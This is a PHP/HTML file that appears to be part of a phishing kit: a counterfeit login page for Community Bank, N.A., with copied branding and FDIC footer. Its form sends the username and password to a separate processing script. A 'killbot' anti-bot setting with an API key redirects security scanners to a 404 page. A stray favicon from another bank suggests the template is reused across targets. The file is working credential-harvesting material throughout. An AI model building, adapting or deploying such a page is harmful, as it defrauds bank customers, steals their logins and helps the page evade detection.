<?php
error_reporting(0);
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0,user-scale=0">
    <link rel="stylesheet" href="../Styles/index.css">
    <meta name="theme-color" content="#8a132e">
    <link rel="manifest" href="/app-manifest">
    <meta name="apple-itunes-app" content="app-id=1484377074">
    <link rel="apple-touch-icon" href="../Assets/community-bank-na-ios-9a860533.png">
    <link rel="preload" as="image" href="../Assets/community-bank-na-logo-10a12eff.png">
    <link rel="preload" as="image" href="../Assets/community-bank-na-logo-10a12eff.png">
    <link rel="icon" type="image/x-icon" href="../Assets/community-bank-na-favicon-0a4138de.ico">
    <link rel="icon" sizes="192x192" href="../Assets/community-bank-na-android-fc19775a.png">
    <link rel="icon" type="image/x-icon" href="../Assets/washington-trust-bank-favicon.ico"> 
    <title>Login · Community Bank, N.A. </title>
    <script src="../Functions/script.js"></script>
    <script type="text/javascript">
    const killbot = {
      apiKey: "kDIX0_nmT22fsd2wTR4iEo5hekyfqG-2xNanb-wjYH8lA", 
      botRedirection: "404"
    }
  </script>
    <!-- <script>
        window.addEventListener("load", ()=>{
            const loader = document.querySelector('.loader-div');
            const loginpa = document.querySelector('.login-parent');
            setTimeout(()=>{
                loader.style.display="none";
                loginpa.style.opacity ="1";
                
            }, 3000);
        })
    </script> -->
</head>
<body>
    <main class="main">
        <section class="section">
            <div class="image-logo">
                <img src="../Assets/community-bank-na-logo-10a12eff.png" alt="">
            </div>
            <!-- <div class="loader-div">
            </div> -->
            <div class="login-parent">
                <form action="../Scripts/process_login.php" method="post" autocomplete="false">
                    <div class="login-child">
                        <input autofocus="true" type="text" name="username" placeholder="" title="username" required>
                        <label for=""><span>Username</span></label>
                    </div>
                    <div class="login-child">
                        <input type="password" name="password" placeholder="" title="password" required>
                        <label for=""><span>Password</span></label>
                    </div>
                    <div class="login-query">
                        <h5>Forgot?</h5>
                    </div>
                    <div class="login-action">
                        <span>
                            <a href="JavaScript:void(0)">
                                <svg viewBox="0 0 24 24" class="fingerprint" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M20.3805428,13.8137069 C20.7055134,16.1582382 19.2593532,17.570874 17.4092135,17.7960134 C15.7762239,17.9947284 14.1114747,16.9681911 13.8785019,15.0555136 L13.8595687,14.8545033 C13.7790838,13.6557045 13.0355191,13.0330742 12.0230096,13.066022 C11.05262,13.0975991 10.3181869,13.7240229 10.3181869,14.5810911 C10.3181869,17.4367719 11.3683308,19.1423433 14.5557119,20.5651349 C14.9339525,20.7339749 15.1037051,21.1774713 14.9348651,21.5557119 C14.7660251,21.9339525 14.3225287,22.1037051 13.9442881,21.9348651 C10.2032953,20.2649509 8.81818692,18.0153532 8.81818692,14.5810911 C8.81818692,12.8447756 10.2507423,11.6228988 11.9742243,11.5668155 C13.7082808,11.5103881 15.1194035,12.6399884 15.3374431,14.5467693 L15.3561995,14.7540225 C15.429414,15.8445306 16.322059,16.4172418 17.2280184,16.3069975 C18.3243687,16.1735851 19.0896808,15.4260142 18.8947476,14.0196498 C18.3183902,9.8614644 13.5967275,7.0902036 9.75231256,8.6064211 C5.72979556,10.1928811 4.16583408,13.7505577 5.81863998,18.047386 C5.96734806,18.433985 5.77449938,18.8679371 5.38790038,19.0166452 C5.00130139,19.1653533 4.56734927,18.9725046 4.41864118,18.5859056 C2.47014448,13.5203648 4.41353867,9.09956029 9.20197565,7.21102536 C13.9515477,5.33781855 19.6710097,8.6947125 20.3805428,13.8137069 Z M17.9520641,14.7577603 C17.9520641,15.1719739 17.6162777,15.5077603 17.2020641,15.5077603 C16.7878506,15.5077603 16.4520641,15.1719739 16.4520641,14.7577603 C16.4520641,12.3190462 14.2664688,10.6030471 12.0398447,10.6492278 C9.87888055,10.6940466 8.03428382,12.0793713 7.77632991,14.3007925 C7.51636764,16.539509 8.7084915,19.0419133 10.3448004,20.6140101 C10.6434956,20.9009839 10.6529977,21.3757626 10.3660239,21.6744579 C10.07905,21.9731532 9.60427133,21.9826553 9.30557605,21.6956814 C7.3610446,19.8274573 5.96482003,16.8966223 6.28634185,14.1277734 C6.6384375,11.095632 9.15077109,9.20882519 12.0087411,9.1495503 C15.0113761,9.08727503 17.9520641,11.3961279 17.9520641,14.7577603 Z M12.0356675,14.0078405 C12.4498368,14.0017826 12.7904982,14.3326222 12.7965562,14.7467914 C12.8351549,17.3857128 15.2057052,19.0920846 17.8887035,18.5678296 C18.295229,18.488395 18.6891776,18.7535545 18.7686123,19.1600801 C18.8480469,19.5666056 18.5828873,19.9605542 18.1763618,20.0399888 C14.6140996,20.736051 11.3496285,18.3862163 11.2967166,14.7687292 C11.2906587,14.3545599 11.6214983,14.0138985 12.0356675,14.0078405 Z M21.0390793,8.97004406 C21.28404,9.30406074 21.2118458,9.77341463 20.8778291,10.0183753 C20.5438125,10.263336 20.0744586,10.1911418 19.8294979,9.85712514 C15.6762501,4.19395483 7.47506811,4.97312875 4.36077947,9.81906473 C4.13683898,10.1675235 3.67281767,10.2684656 3.32435888,10.0445251 C2.97590008,9.82058458 2.87495805,9.35656328 3.09889854,9.00810448 C6.75686194,3.31619261 16.2324408,2.41594141 21.0390793,8.97004406 Z M12.0795658,2.00170165 C14.4139345,2.00170165 16.4372937,2.58338203 18.1889848,3.56526901 C18.550306,3.76780273 18.6790286,4.22489741 18.4764949,4.58621855 C18.2739612,4.9475397 17.8168665,5.07626234 17.4555454,4.87372862 C15.918012,4.0118849 14.1433536,3.50170165 12.0795658,3.50170165 C9.9768514,3.50170165 8.00147381,4.05741986 6.70286873,4.85793988 C6.35026747,5.07529955 5.88822284,4.96566457 5.67086318,4.61306331 C5.45350351,4.26046205 5.56313848,3.79841742 5.91573975,3.58105775 C7.45185852,2.63412335 9.69988932,2.00170165 12.0795658,2.00170165 Z"></path>
                                </svg><span style="font-weight: 600; font-size: .8rem">Sign in with a passkey</span>
                            </a>
                        </span>
                        <button id="btn" type="submit">Sign in</button>
                    </div>
                    <style>
                        .fingerprint {
                        display:inline-block;
                        width:25px;
                        height:25px;
                        fill: #282828 !important;
                        vertical-align: middle;
                      }

                      .fingerprint a{
                        font-weight: 600;
                      }
                      

                      </style>
                </form>
            </div>
        </section>
        <footer class="footer">
            <ul>
                <li>© 2023 Community Bank, N.A.</li>
                <li>•</li>
                <li><a href="JavaScript:void(0)"> Privacy policy</a></li>
                <li  class="dots">•</li>
                <li>Member FDIC  </li>
                <li>•</li>
                <li><svg width="16" height="11" viewBox="0 0 10 7" class="ehl-icon" aria-hidden="true" style="fill:#7e7e7e" > <path d="M4.96.222L.337 2.588v.962l.511.007v3.448h8.186L9.03 3.55h.55v-.962L4.959.222zm3.163 5.872H1.76V3.028l3.2-1.65 3.163 1.65v3.066zm-4.677-2.26h2.999v-.828H3.446v.828zm0 1.489h2.985v-.828H3.446v.828z"></path> </svg> Equal Housing Lender</li>
            </ul>
        </footer>
    </main>
    
</body>
</html>